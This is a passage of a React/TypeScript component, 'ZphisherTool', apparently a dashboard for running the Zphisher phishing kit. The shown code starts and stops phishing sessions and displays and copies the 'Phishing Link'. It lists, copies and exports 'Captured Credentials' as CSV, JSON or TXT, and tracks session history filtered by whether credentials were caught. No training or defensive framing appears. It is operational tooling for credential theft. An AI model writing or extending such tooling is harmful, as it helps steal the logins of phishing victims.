                className="px-6 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition disabled:opacity-50"
                onClick={startSession}
                disabled={!!sessionId || loading || templateLoading || !!templateError}
              >
                Start Session
              </button>
              <button
                className="px-6 py-2 bg-red-500 text-white rounded hover:bg-red-600 transition disabled:opacity-50"
                onClick={stopSession}
                disabled={!sessionId || loading}
              >
                Stop Session
              </button>
            </div>
          </div>
          {status && (
            <div className="bg-gray-50 rounded shadow p-6 mb-6">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg font-semibold">Session Status</h2>
                <div className="flex items-center gap-2">
                  <div className={`w-3 h-3 rounded-full ${status.status === 'running' ? 'bg-green-500 animate-pulse' : 'bg-gray-400'}`}></div>
                  <span className="font-mono text-blue-700">{status.status}</span>
                </div>
              </div>
              
              {status.public_url && (
                <div className="mb-4 p-3 bg-blue-50 rounded border-l-4 border-blue-400">
                  <div className="flex items-center justify-between">
                    <div>
                      <span className="font-semibold text-blue-800">Phishing Link:</span>
                      <a href={status.public_url} target="_blank" rel="noopener noreferrer" 
                         className="ml-2 text-blue-600 underline break-all hover:text-blue-800">
                        {status.public_url}
                      </a>
                    </div>
                    <button
                      onClick={() => copyToClipboard(status.public_url)}
                      className="px-2 py-1 bg-blue-100 text-blue-700 rounded text-xs hover:bg-blue-200"
                      title="Copy link"
                    >
                      📋 Copy
                    </button>
                  </div>
                </div>
              )}
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                <div className="bg-white rounded p-3">
                  <span className="font-semibold text-gray-700">Template:</span>
                  <span className="ml-2 text-gray-900">{status.template}</span>
                </div>
                <div className="bg-white rounded p-3">
                  <span className="font-semibold text-gray-700">Tunnel:</span>
                  <span className="ml-2 text-gray-900">{status.tunnel_type}</span>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <div className="flex items-center justify-between mb-2">
                    <span className="font-semibold">Captured Credentials ({credentials.length})</span>
                    {credentials.length > 0 && (
                      <button
                        onClick={() => copyToClipboard(credentials.join('\n'))}
                        className="px-2 py-1 bg-green-100 text-green-700 rounded text-xs hover:bg-green-200"
                        title="Copy all credentials"
                      >
                        📋 Copy All
                      </button>
                    )}
                  </div>
                  <div 
                    ref={credentialsRef}
                    className="bg-black text-green-400 rounded p-3 max-h-48 overflow-y-auto text-xs font-mono"
                  >
                    {credentials.length > 0 ? (
                      credentials.map((cred: string, i: number) => (
                        <div key={i} className="flex items-center justify-between py-1">
                          <span className="text-green-400">{cred}</span>
                          <button
                            onClick={() => copyToClipboard(cred)}
                            className="text-gray-400 hover:text-white text-xs ml-2"
                            title="Copy credential"
                          >
                            📋
                          </button>
                        </div>
                      ))
                    ) : (
                      <span className="text-gray-500">No credentials captured yet...</span>
                    )}
                  </div>
                </div>

                <div>
                  <div className="flex items-center justify-between mb-2">
                    <span className="font-semibold">Live Terminal Output</span>
                    <div className="flex items-center gap-2">
                      <label className="flex items-center text-xs">
                        <input
                          type="checkbox"
                          checked={showNotifications}
                          onChange={(e) => setShowNotifications(e.target.checked)}
                          className="mr-1"
                        />
                        Notifications
                      </label>
                      <button
                        onClick={() => copyToClipboard(output.join('\n'))}
                        className="px-2 py-1 bg-gray-100 text-gray-700 rounded text-xs hover:bg-gray-200"
                        title="Copy all output"
                      >
                        📋 Copy All
                      </button>
                    </div>
                  </div>
                  <div 
                    ref={terminalRef}
                    className="bg-black text-green-400 rounded p-3 max-h-48 overflow-y-auto text-xs font-mono"
                  >
                    {output.length > 0 ? (
                      output.slice(-50).map((line: string, i: number) => (
                        <div key={i} className={`py-0.5 ${
                          line.toLowerCase().includes('error') ? 'text-red-400' :
                          line.toLowerCase().includes('warning') ? 'text-yellow-400' :
                          line.toLowerCase().includes('success') ? 'text-green-400' :
                          line.toLowerCase().includes('info') ? 'text-blue-400' :
                          'text-green-400'
                        }`}>
                          {line}
                        </div>
                      ))
                    ) : (
                      <span className="text-gray-500">Waiting for output...</span>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      )}
      {tab === 'history' && (
        <div>
          <h2 className="text-xl font-bold mb-4">Session History</h2>
          
          {/* Advanced Filters */}
          <div className="bg-white rounded shadow p-4 mb-6">
            <h3 className="font-semibold mb-3">Filters</h3>
            <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
              <div>
                <label className="block text-sm font-medium mb-1">Template</label>
                <input
                  type="text"
                  className="w-full border rounded px-3 py-2 text-sm"
                  placeholder="Filter by template..."
                  value={historyFilter.template}
                  onChange={e => setHistoryFilter(prev => ({ ...prev, template: e.target.value }))}
                />
              </div>
              <div>
                <label className="block text-sm font-medium mb-1">Status</label>
                <select
                  className="w-full border rounded px-3 py-2 text-sm"
                  value={historyFilter.status}
                  onChange={e => setHistoryFilter(prev => ({ ...prev, status: e.target.value }))}
                >
                  <option value="">All Status</option>
                  <option value="running">Running</option>
                  <option value="stopped">Stopped</option>
                  <option value="completed">Completed</option>
                  <option value="error">Error</option>
                </select>
              </div>
              <div>
                <label className="block text-sm font-medium mb-1">Date Range</label>
                <select
                  className="w-full border rounded px-3 py-2 text-sm"
                  value={historyFilter.dateRange}
                  onChange={e => setHistoryFilter(prev => ({ ...prev, dateRange: e.target.value }))}
                >
                  <option value="all">All Time</option>
                  <option value="today">Today</option>
                  <option value="week">This Week</option>
                  <option value="month">This Month</option>
                </select>
              </div>
              <div className="flex items-end">
                <label className="flex items-center">
                  <input
                    type="checkbox"
                    checked={historyFilter.hasCredentials}
                    onChange={e => setHistoryFilter(prev => ({ ...prev, hasCredentials: e.target.checked }))}
                    className="mr-2"
                  />
                  <span className="text-sm">Has Credentials</span>
                </label>
              </div>
            </div>
          </div>

          <div className="mb-4 flex gap-8 text-sm">
            <div><b>Total Sessions:</b> {totalSessions}</div>
            <div><b>Sessions with Credentials:</b> {sessionsWithCreds}</div>
            <div><b>Most Used Template:</b> {mostUsedTemplate}</div>
            <div><b>Filtered Results:</b> {filteredHistory.length}</div>
          </div>
          
          {historyLoading ? (
            <div className="text-center py-8">Loading history...</div>
          ) : (
            <div className="bg-white rounded shadow overflow-hidden">
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-gray-100">
                    <th className="p-3 text-left">Template</th>
                    <th className="p-3 text-left">Tunnel</th>
                    <th className="p-3 text-left">Status</th>
                    <th className="p-3 text-center">Credentials</th>
                    <th className="p-3 text-left">Started</th>
                    <th className="p-3 text-left">Tag</th>
                    <th className="p-3 text-left">Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredHistory.map(s => (
                    <tr key={s.session_id} className="border-b hover:bg-gray-50">
                      <td className="p-3">
                        <div className="font-semibold">{s.template}</div>
                        <div className="text-xs text-gray-500">{s.session_id}</div>
                      </td>
                      <td className="p-3">{s.tunnel_type}</td>
                      <td className="p-3">
                        <span className={`px-2 py-1 rounded text-xs font-semibold ${
                          s.status === 'running' ? 'bg-green-100 text-green-800' :
                          s.status === 'stopped' ? 'bg-gray-100 text-gray-800' :
                          s.status === 'error' ? 'bg-red-100 text-red-800' :
                          'bg-blue-100 text-blue-800'
                        }`}>
                          {s.status}
                        </span>
                      </td>
                      <td className="p-3 text-center">
                        <span className={`px-2 py-1 rounded text-xs font-semibold ${
                          s.credentials_count > 0 ? 'bg-green-100 text-green-800' : 'bg-gray-100 text-gray-600'
                        }`}>
                          {s.credentials_count}
                        </span>
                      </td>
                      <td className="p-3 text-sm">
                        {s.start_time ? new Date(s.start_time * 1000).toLocaleString() : '-'}
                      </td>
                      <td className="p-3">
                        <input
                          type="text"
                          className="w-full border rounded px-2 py-1 text-xs"
                          placeholder="Add tag..."
                          value={sessionTags[s.session_id] || ''}
                          onChange={e => addSessionTag(s.session_id, e.target.value)}
                        />
                      </td>
                      <td className="p-3">
                        <div className="flex gap-1">
                          <button 
                            className="px-2 py-1 bg-blue-100 text-blue-700 rounded text-xs hover:bg-blue-200"
                            onClick={() => fetchSessionDetail(s.session_id)}
                          >
                            View
                          </button>
                          <select
                            className="px-2 py-1 bg-green-100 text-green-700 rounded text-xs border-0"
                            value={exportFormat}
                            onChange={e => exportSession(s.session_id, e.target.value as 'csv' | 'json' | 'txt')}
                          >
                            <option value="csv">CSV</option>
                            <option value="json">JSON</option>
                            <option value="txt">TXT</option>
                          </select>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
              {filteredHistory.length === 0 && (
                <div className="text-center py-8 text-gray-500">No sessions match the current filters.</div>
              )}
            </div>
          )}
          {selectedSession && (
            <div className="bg-white rounded shadow p-4 mb-6">
              <h3 className="font-semibold mb-2">Session Detail</h3>
              <div className="mb-2"><b>Template:</b> {selectedSession.template}</div>
              <div className="mb-2"><b>Tunnel:</b> {selectedSession.tunnel_type}</div>
              <div className="mb-2"><b>Status:</b> {selectedSession.status}</div>
              <div className="mb-2"><b>Phishing Link:</b> {selectedSession.public_url}</div>
              <div className="mb-2"><b>Started:</b> {selectedSession.start_time ? new Date(selectedSession.start_time * 1000).toLocaleString() : '-'}</div>
              <div className="mb-2"><b>Ended:</b> {selectedSession.end_time ? new Date(selectedSession.end_time * 1000).toLocaleString() : '-'}</div>
              <div className="mb-2"><b>Credentials:</b>
                <ul className="list-disc ml-6 mt-1">
                  {selectedSession.credentials && selectedSession.credentials.length > 0 ? (
                    selectedSession.credentials.map((cred: string, i: number) => <li key={i} className="font-mono text-green-700">{cred}</li>)
                  ) : <li className="text-gray-500">None yet</li>}
                </ul>
              </div>
              <div className="mb-2"><b>Output:</b>
                <pre className="bg-black text-green-400 rounded p-2 mt-1 max-h-48 overflow-y-auto text-xs">
                  {selectedSession.output && selectedSession.output.length > 0 ? selectedSession.output.slice(-30).join('\n') : 'No output yet.'}
                </pre>
              </div>
              <button className="px-3 py-1 bg-gray-200 rounded text-xs" onClick={() => setSelectedSession(null)}>Close</button>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default ZphisherTool; 